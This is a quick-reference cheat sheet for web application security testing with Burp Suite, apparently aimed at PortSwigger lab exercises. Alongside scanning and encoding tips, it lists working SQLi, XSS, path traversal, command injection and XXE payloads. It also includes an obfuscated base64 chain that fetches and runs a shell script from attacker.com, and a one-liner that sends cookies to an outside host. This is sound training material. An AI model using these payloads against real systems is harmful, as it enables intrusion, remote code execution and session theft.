# Essential Skills - Cheat Sheet

Rapid reference for essential web application security testing techniques.

---

## Core Techniques

### Targeted scanning (Burp)

Use when time-constrained, when one endpoint is suspicious, or for large apps. Burp Proxy → HTTP History → right-click request → "Do active scan" → choose `All except time-based detection`. Review findings as they arrive.

### Scan selected insertion point

For non-standard data structures: delimited values (`user:token`, `id|role`), JSON in headers/cookies, base64-with-internal-structure. Send to Repeater → highlight only the inner field → right-click → "Scan selected insertion point".

```http
Cookie: session=wiener:AbCdEfGh...
                ^^^^^^   highlight only this slice
```

---

## Encoding Techniques

**URL** — `space=%20|+ <=%3C >=%3E '=%27 "=%22 /=%2F \=%5C ;=%3B &=%26`. Double-encode `%2F → %252F` when filter decodes once. Path traversal: `../../../etc/passwd` blocked → `..%2f..%2f..%2fetc%2fpasswd` blocked → `..%252f..%252fetc%252fpasswd` often passes.

**HTML** — `<=&lt;|&#60;|&#x3C; >=&gt;|&#62;|&#x3E; "=&quot;|&#34; '=&#39;|&apos; &=&amp;`. XSS encoded: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>` runs `alert(1)`.

**XML entities** (SQL keyword bypass in XML body): `1 &#85;NION &#83;ELECT NULL` or `1 &#x55;NION &#x53;ELECT NULL`.

**JS Unicode** (`\uXXXX`): `<script>alert(1)</script>`. Use in JS-string contexts.

**SQL hex / CHAR()**: `WHERE username=0x61646d696e` or `WHERE username=CHAR(97,100,109,105,110)`. Bypass quote/keyword filters.

**Base64**: `echo -n payload | base64` / `base64 -d`. Useful for JWTs and chained obfuscation: `; echo Y3VybCBhdHRhY2tlci5jb20vc2hlbGwuc2gK | base64 -d | bash`.

---

## Burp Suite Quick Commands

**Scanner configurations**:
- Fast: `Audit checks → All except time-based detection`
- Thorough: `Audit checks → All`
- Custom (XSS focus): `Cross-site scripting (reflected/stored/DOM)` only

**Collaborator**: Burp menu → Burp Collaborator client → "Copy to clipboard" → paste into payload → "Poll now" → review HTTP/DNS interactions. Exfil format: `?c=<data>` in URL.

**Repeater**: Ctrl/Cmd-R send-to-repeater, Ctrl-Space send. Right-click in request body → "Scan" or "Scan selected insertion point".

**Decoder**: paste data → choose URL/HTML/Base64/Hex/Gzip → encode/decode (chain operations).

---

## Mystery Lab Strategy

### Recon (15 min)

Authentication (login/registration/reset), search, user-generated content (comments/posts), file upload, admin panel (`/admin`, `/administrator`), APIs (browser network tab), profile/account settings.

### Vulnerability sweep (30 min)

```
SQLi          : ' OR '1'='1'--   1' UNION SELECT NULL--   1' ORDER BY 1--
XSS           : <script>alert(1)</script>   <img src=x onerror=alert(1)>   <svg/onload=alert(1)>
Access ctrl   : /admin   IDOR via id params   role swap   POST↔GET method swap
Path traversal: ../../../../etc/passwd   ..%2f...%2fetc%2fpasswd   ..%252f...%252fetc%252fpasswd
Cmd injection : ; whoami   | whoami   `whoami`   $(whoami)
XXE           : <!DOCTYPE foo[<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
CSRF          : check token presence + validation + SameSite + method downgrade
```

### Likely-vuln-by-feature

| Feature | Likely class |
|---------|---|
| Login / auth | SQLi, brute force, timing |
| Search | SQLi, XSS |
| Comments / UGC | Stored XSS, CSRF |
| File upload | RCE, traversal, XXE |
| User profile | IDOR, XSS, CSRF |
| Admin panel | Access control bypass |
| API endpoints | IDOR, mass assignment, XXE |
| Password reset | Account takeover, parameter pollution |

---

## Encoding by Context

| Context | Encoding | Example |
|---|---|---|
| URL parameter | URL | `?search=%3Cscript%3E` |
| HTML body | HTML entities | `<div>&#60;script&#62;</div>` |
| JS string | Unicode escape | `var x='<script>';` |
| SQL string | Hex / CHAR() | `WHERE id=0x31` |
| XML data | XML entities | `<data>&#60;script&#62;</data>` |
| JSON value | JSON escape | `{"input":"<script>"}` |
| HTTP header | ASCII / URL | `Header: value%0d%0a` |
| Cookie | URL encoding | `Cookie: name=%3Cscript%3E` |

---

## Time Allocation Template

```
0-15 min : Recon — features, inputs, cookies, JS bundles
15-20 min: Hypothesis generation
20-50 min: Systematic testing
50-65 min: Exploitation
65-70 min: Verification + evidence
```

---

## Anti-Patterns

- Full-site scans wasting time on irrelevant endpoints
- Ignoring scanner findings or waiting until scan completes
- Scanning the entire cookie instead of a sub-field
- Forgetting to URL-encode payloads in cookies / headers
- Forgetting to poll Collaborator
- Over-encoding when only one char needs it

## Best Practices

- Targeted scans over full-site scans; review findings as they arrive
- "Scan selected insertion point" for non-standard structures
- Verify scanner findings manually
- Use Collaborator for blind classes and exfil
- Start simple, then encode; combine techniques

---

## Decision Trees

**Targeted scan?** Time pressure / known suspicious endpoint / large app / not testing everything → yes.
**"Scan selected insertion point"?** Delimited value / JSON in header-cookie / base64 with structure / non-standard format → yes.
**Encoding to try?** URL param → URL. HTML body → entities. JS string → Unicode. XML keyword filter → XML entities. SQL quote filter → hex / CHAR(). Everything blocked → double-encode or base64.

---

## Keyboard Shortcuts

```
Burp:   Ctrl-R send-to-Repeater   Ctrl-I send-to-Intruder   Ctrl-Space send
        Ctrl-Shift-R change method
Browser: F12 devtools   Ctrl-Shift-C inspect   Ctrl-R reload   Ctrl-Shift-R hard reload
```

---

## One-Liners

```
Targeted scan        : right-click request → Do active scan → All except time-based
Insertion-point scan : highlight slice → right-click → Scan selected insertion point
Collaborator         : Burp menu → Collaborator → Copy → Poll now
URL encode           : Decoder → paste → Encode as → URL
HTML encode          : Decoder → paste → Encode as → HTML
XXE XInclude         : <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse=text href=file:///etc/passwd/></foo>
XSS cookie exfil     : <script>location='https://COLLAB/?c='+document.cookie</script>
SQL XML keyword      : &#85;NION &#83;ELECT  ==  UNION SELECT
```

---

## Resources

- Web Security Academy (essential skills): https://portswigger.net/web-security/essential-skills
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- [Quick Start](./essential-skills-quickstart.md), [Resources](./essential-skills-resources.md), [Index](./essential-skills-index.md)
